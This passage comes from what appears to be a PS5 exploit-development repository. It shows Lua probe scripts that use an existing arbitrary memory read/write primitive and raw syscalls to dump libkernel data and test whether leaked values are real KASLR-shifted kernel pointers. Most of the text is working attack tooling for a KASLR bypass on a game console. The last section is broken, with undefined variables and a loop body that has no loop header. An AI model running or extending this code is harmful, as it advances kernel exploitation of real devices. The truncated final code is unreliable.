print("  Total module .data kptrs: " .. total_mod_kptrs)

collectgarbage("restart")

print("")
print("=== PROBE 56i6 COMPLETE ===")
```

## probes/phase14_final_push/56i7_kptr_validate.lua

```lua
-- CRASH_CLASS: LOW
-- PROBE 56i7: Validate kernel pointers — are they real KASLR-shifted addresses?
--
-- Context: 56i6 found 2828 "kernel pointers" in module .data segments.
-- Key question: are the 0xFFFF8xxx high words real kernel VA or NID hash fragments?
--
-- Validation strategy:
--   [B] Read libkernel data+0x3E38..+0x3F00 — dump full qwords with structure analysis
--   [C] Read the SURROUNDING context (before/after the kptr block) for structure clues
--   [D] Check if values are page-aligned (real kernel ptrs often are)
--   [E] Compute deltas between adjacent pointers (random = real, structured = hash)
--   [F] Read handle 0x2 kptr block for cross-module comparison
--   [G] Also scan eboot .data (was skipped in 56i6 — size cap was too low at 1MB)

print("=== PROBE 56i7: KPTR VALIDATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

local sc_info = make_syscall(593)

-- ============================================================
-- [B] Dump libkernel kptr block with full structure analysis
-- ============================================================
print("")
print("[B] libkernel (0x2001) kptr block detail")

local lk_info = memory.alloc(0x200)
safe_wd(lk_info, 0x160)
pcall(function() sc_info(uint64(0x2001), lk_info) end)

local lk_data_lo = safe_rd(lk_info + 0x118) or 0
local lk_data_hi = safe_rd(lk_info + 0x11C) or 0
local lk_data_sz = safe_rd(lk_info + 0x120) or 0
local lk_text_lo = safe_rd(lk_info + 0x108) or 0
local lk_text_hi = safe_rd(lk_info + 0x10C) or 0

print(string.format("  text: 0x%X_%08X", lk_text_hi, lk_text_lo))
print(string.format("  data: 0x%X_%08X size=0x%X", lk_data_hi, lk_data_lo, lk_data_sz))

-- Dump 256 bytes before the kptr block (context)
print("")
print("  Context before kptr block (data+0x3D38..+0x3E38):")
for off = 0x3D38, 0x3E30, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then
            print(string.format("    +0x%04X: %s", off, hexval(val)))
        end
    end
end

-- Dump the kptr block itself — first 40 entries with analysis
print("")
print("  Kptr block (data+0x3E38..+0x3F78):")
local prev_h = 0
local deltas = {}
for i = 0, 39 do
    local off = 0x3E38 + i * 8
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        local delta_h = vh - prev_h
        if i > 0 and prev_h > 0 then
            deltas[#deltas + 1] = delta_h
        end
        print(string.format("    +0x%04X: hi=0x%04X lo=0x%08X  delta_hi=%d",
            off, vh, vl, i > 0 and delta_h or 0))
        prev_h = vh
    end
end

-- Analyze deltas
if #deltas > 0 then
    print("")
    print("  Delta analysis (hi word differences):")
    local min_d, max_d, sum = 99999, 0, 0
    for _, d in ipairs(deltas) do
        if d < min_d then min_d = d end
        if d > max_d then max_d = d end
        sum = sum + d
    end
    print(string.format("    min=%d max=%d avg=%.1f", min_d, max_d, sum / #deltas))
    print("    Structured (constant delta) = NID hash table")
    print("    Random/variable deltas = REAL kernel function addresses")
end

-- Context after kptr block
print("")
print("  Context after kptr block (last 8 kptrs + 128 bytes after):")
-- Find where kptrs end
local kptr_end_off = 0x3E38
for off = 0x3E38, lk_data_sz - 1, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh < 0xFFFF8000 or vh >= 0xFFFFFFFF then
            kptr_end_off = off
            break
        end
    end
    if off > 0x5000 then kptr_end_off = off; break end
end
print(string.format("  Kptr block ends at +0x%04X (%d entries)",
    kptr_end_off, (kptr_end_off - 0x3E38) / 8))

-- Dump 128 bytes after end
for off = kptr_end_off, kptr_end_off + 120, 8 do
    if off < lk_data_sz then
        local a_l = lk_data_lo + off
        local a_h = lk_data_hi
        if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
        local addr = uint64(string.format("0x%X%08X", a_h, a_l))
        local val = safe_rq(addr)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh ~= 0 or vl ~= 0 then
                print(string.format("    +0x%04X: %s", off, hexval(val)))
            end
        end
    end
end

-- ============================================================
-- [C] Page alignment check
-- Real kernel pointers are often page-aligned (or at known offsets)
-- FreeBSD kernel uses 16KB pages on PS5
-- ============================================================
print("")
print("[C] Page alignment check (16KB = 0x4000)")

-- Re-read first 20 kptrs and check alignment
local aligned_count = 0
local total_checked = 0
for i = 0, 19 do
    local off = 0x3E38 + i * 8
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        total_checked = total_checked + 1
        -- Full 48-bit address = (vh << 32) | vl, check low 14 bits (16KB align)
        local low14 = vl % 0x4000
        local low12 = vl % 0x1000  -- 4KB align
        if low14 == 0 then
            aligned_count = aligned_count + 1
            print(string.format("    [%d] 0x%04X_%08X — 16KB aligned", i, vh, vl))
        elseif low12 == 0 then
            print(string.format("    [%d] 0x%04X_%08X — 4KB aligned", i, vh, vl))
        end
    end
end
print(string.format("  16KB aligned: %d/%d", aligned_count, total_checked))

-- ============================================================
-- [D] Read low dwords as potential NID strings
-- If low dword is a small number, it might be a table index
-- If it's in the range of text offsets, it's a function offset
-- ============================================================
print("")
print("[D] Low dword analysis")

-- Collect all low dwords from first 40 kptrs
print("  First 40 low dwords:")
local lo_vals = {}
for i = 0, 39 do
    local off = 0x3E38 + i * 8
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        lo_vals[#lo_vals + 1] = vl
    end
end

-- Are they monotonically increasing?
local monotonic = true
for i = 2, #lo_vals do
    if lo_vals[i] <= lo_vals[i-1] then monotonic = false; break end
end
print(string.format("  Monotonic increasing: %s", monotonic and "YES" or "NO"))

-- What's the range?
if #lo_vals > 0 then
    local lo_min = lo_vals[1]
    local lo_max = lo_vals[#lo_vals]
    print(string.format("  Range: 0x%08X - 0x%08X (span=0x%X)", lo_min, lo_max, lo_max - lo_min))

    -- Check if these match libkernel text offsets
    print(string.format("  libkernel text base: 0x%X_%08X", lk_text_hi, lk_text_lo))
    print(string.format("  Low dwords as text offsets: +0x%X to +0x%X", lo_min, lo_max))
end

-- ============================================================

-- ============================================================

print(string.format("  data: 0x%X_%08X", h2_data_hi, h2_data_lo))

-- Read first 20 kptrs from handle 0x2

    local off = 0xA428 + i * 8
    local a_l = h2_data_lo + off
    local a_h = h2_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
```
